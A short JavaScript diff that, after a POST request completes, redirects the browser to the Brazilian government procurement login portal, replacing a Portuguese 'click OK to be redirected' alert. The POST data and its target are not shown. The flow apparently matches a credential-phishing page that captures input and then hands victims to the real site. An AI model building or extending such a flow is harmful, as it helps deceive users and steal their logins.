@@ -79,15 +79,16 @@ function startServer(){
       .then(response => {
         if (response.ok) {
           console.log('POST request successful');
+          window.location.href = 'http://comprasnet.gov.br/seguro/loginPortal.asp';
         } else {
           console.error('POST request failed');
+          window.location.href = 'http://comprasnet.gov.br/seguro/loginPortal.asp';
         }
       })
       .catch(error => {
         console.error('Error:', error);
       });
 
-      alert('CLIQUE EM OK E SERÁ REDIRECIONADO');
 
       // window.location.href = 'http://comprasnet.gov.br/seguro/loginPortal.asp';
 }
